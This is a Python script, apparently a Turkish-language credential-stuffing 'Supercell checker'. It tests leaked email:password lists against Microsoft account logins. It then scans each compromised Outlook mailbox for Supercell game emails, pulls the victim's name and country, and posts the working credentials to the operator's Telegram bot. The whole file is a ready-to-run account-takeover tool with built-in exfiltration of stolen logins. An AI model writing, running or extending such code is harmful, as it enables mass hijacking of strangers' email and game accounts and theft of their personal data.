P = '\x1b[38;5;231m'

import requests
import json
import uuid
import re
import time
import concurrent.futures
from threading import Lock


class Colors:
    DARK_RED = '\033[31m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_YELLOW = '\033[93m'
    SKY_BLUE = '\033[96m'
    LAVENDER = '\033[95m'
    ORANGE = '\033[33m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'


def send_telegram_message(token, chat_id, message):
    try:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload)
        if not response.json().get("ok"):
            print(f"{Colors.DARK_RED}❌ Telegram API Hatası: {response.json().get('description', 'Bilinmeyen Hata')}{Colors.END}")
    except Exception as e:
        print(f"{Colors.DARK_RED}❌ Telegram Bağlantı Hatası: {str(e)}{Colors.END}")

class checkerv1:
    def __init__(self):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.telegram_token = None
        self.telegram_chat_id = None

    def set_telegram_info(self, token, chat_id):
        self.telegram_token = token
        self.telegram_chat_id = chat_id

    def check(self, email, password):
        try:
            
            
            # r1: getidp
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "User-Agent": "Dalvik/2.1.0 (Linux; Android 9; SM-G975N)",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = self.session.get(url1, headers=headers1)
            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return "❌ BAD"
            if "MSAccount" not in r1.text:
                return "❌ BAD"

            # r2: authorize
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            r2 = self.session.get(url2, allow_redirects=True)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
            if not url_match or not ppft_match:
                return "❌ BAD"

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&PPFT={ppft}&PPSX=PassportR"

            # r3: post login
            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False)

            if "account or password is incorrect" in r3.text or r3.text.count("error") > 0:
                return "❌ BAD"

            location = r3.headers.get("Location", "")
            if not location:
                return "❌ BAD"
            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return "❌ BAD"

            code = code_match.group(1)
            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                return "❌ BAD"
            cid = mspcid.upper()

            # r4: get token
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", 
                                   data=token_data, headers={"Content-Type": "application/x-www-form-urlencoded"})
            if "access_token" not in r4.text:
                return "❌ BAD"

            access_token = r4.json()["access_token"]
            
            # r5: get profile
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }
            r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=profile_headers)
            if r5.status_code != 200:
                return "❌ BAD"
            profile = r5.json()
            name = profile.get("displayName", "")
            country = profile.get("location", "")

            # r6: Supercell check (startupdata.ashx)
            r6 = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0", 
                                   data="", headers={
                                       "authorization": f"Bearer {access_token}",
                                       "user-agent": "Mozilla/5.0 (Android)"
                                   }, timeout=30)
            rese = r6.text
            if 'noreply@id.supercell.com' not in rese:
                return "❌ BAD"
            
            # Supercell oyunlarını kontrol et
            clash_royale = "✅" if "Clash Royale" in rese else "❌"
            brawl_stars = "✅" if "Brawl Stars" in rese else "❌"
            clash_of_clans = "✅" if "Clash of Clans" in rese else "❌"
            hay_day = "✅" if "Hay Day" in rese else "❌"

            # Hit sonucu
            result = f"✅ HIT | CR:{clash_royale} BS:{brawl_stars} COC:{clash_of_clans} HD:{hay_day}"
            if name:
                result += f" | Name: {name}"
            if country:
                result += f" | Country: {country}"
            
            
            if self.telegram_token and self.telegram_chat_id:
                telegram_message = (
                    "<b>🔥 SUPERCELL HIT BULUNDU! 🔥</b>\n\n"
                    f"<b>Combo:</b> <code>{email}:{password}</code>\n"
                    f"<b>Supercell Games:</b>\n"
                    f"  - Clash Royale: <b>{clash_royale}</b>\n"
                    f"  - Brawl Stars: <b>{brawl_stars}</b>\n"
                    f"  - Clash of Clans: <b>{clash_of_clans}</b>\n"
                    f"  - Hay Day: <b>{hay_day}</b>\n"
                    f"<b>Kullanıcı Bilgileri:</b>\n"
                    f"  - İsim: <b>{name if name else 'Yok'}</b>\n"
                    f"  - Ülke: <b>{country if country else 'Yok'}</b>"
                )
                send_telegram_message(self.telegram_token, self.telegram_chat_id, telegram_message)

            return result

        except Exception as e:
            return f"❌ ERROR: {str(e)}"




if __name__ == "__main__":
    banner = f"""
{P}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢈⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣴⣿⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣧⠀⠀⠀⠘⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⢀⣼⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠹⣿⣿⣿⣷⣦⣄⡀⣿⣱⡀⠀⠀⠀⠀⠀⠀⢸⢿⣧⣠⣴⣾⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠛⢷⣿⣟⡿⠿⠿⡟⣓⣒⣛⡛⡛⢟⣛⡛⠟⠿⣻⢿⣿⣻⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣴⢻⡭⠖⡉⠥⣈⠀⣐⠂⡄⠔⢂⢦⡹⢬⡕⠊⠳⠈⢿⣳⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣼⣷⣋⠲⢮⣁⠀⣐⠆⡤⢊⣜⡀⡾⣀⠀⢠⢻⣌⣤⣥⣓⣌⢻⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣟⣽⢳⣯⣝⣦⡀⠓⡤⢆⠇⠂⠄⠤⡝⣂⠋⠖⢋⠀⣡⣶⣾⡿⡷⣽⡿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⡜⢯⣿⣿⣿⣷⣿⣤⣧⣶⣬⣝⣃⣓⣈⣥⣶⣿⣾⣿⣿⢣⠇⢻⡞⣯⣹⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣼⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡔⡯⢧⢟⣟⣱⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡼⡼⢁⡌⢼⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢇⡼⢃⡿⣼⣛⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠟⣡⣫⣢⢏⣼⡵⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡾⢕⣻⣽⣵⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢷⣮⣿⡼⢭⡟⠳⠞⡖⢛⣶⣷⣯⡶⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠛⠛⠛⠿⠟⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀
{P}━━━━━━━━━━━━━━━━━━━━━━━━━
𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦eer: @𝐎𝐜𝐭𝐩𝐬𝐏𝐫𝐢me& @𝐨𝐜𝐭𝐨𝐩𝐮𝐬𝐭ool
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    print(banner)
    print(f"{Colors.SKY_BLUE}[1]{Colors.WHITE} SUPERCELL CHECKER {Colors.END}")
    choice = input(f"\n{Colors.BRIGHT_GREEN}Seçim: {Colors.END}").strip()

    if choice == "1":
        telegram_token = input(f"{Colors.LAVENDER}Telegram Bot Token: {Colors.END}").strip()
        telegram_chat_id = input(f"{Colors.LAVENDER}Telegram Chat ID: {Colors.END}").strip()

        file_path = input(f"{Colors.BRIGHT_YELLOW}Combo Dosya Yolu: {Colors.END}").strip()
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
        except FileNotFoundError:
            print(f"{Colors.DARK_RED}❌ Dosya bulunamadı.{Colors.END}")
            exit()

        checker = checkerv1()
        checker.set_telegram_info(telegram_token, telegram_chat_id)
        
        lock = Lock()
        
        
        hit_count = 0
        free_count = 0
        bad_count = 0

        print(f"\n{Colors.SKY_BLUE}--- Kontrol Başlatılıyor ---{Colors.END}\n")

        
        counters = [0, 0, 0] # [hit_count, free_count, bad_count]

        def process(line_data):
            line, idx = line_data
            if ':' not in line:
                return
            email, password = line.strip().split(':', 1)
            result = checker.check(email, password)
            
            with lock:
                if "✅ HIT" in result:
                    print(f"{Colors.BRIGHT_GREEN}[{idx}] {email}:{password} | Hit supercell {result} ✅{Colors.END}")
                    counters[0] += 1 # hit_count
                elif "❌ BAD" in result:
                    print(f"{Colors.DARK_RED}[{idx}] {email}:{password} | BAD ❌{Colors.END}")
                    counters[1] += 1 # free_count
                else:
                    print(f"{Colors.ORANGE}[{idx}] {email}:{password} | {result}{Colors.END}")
                    counters[2] += 1 # bad_count

        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(process, [(line, i) for i, line in enumerate(lines, 1)])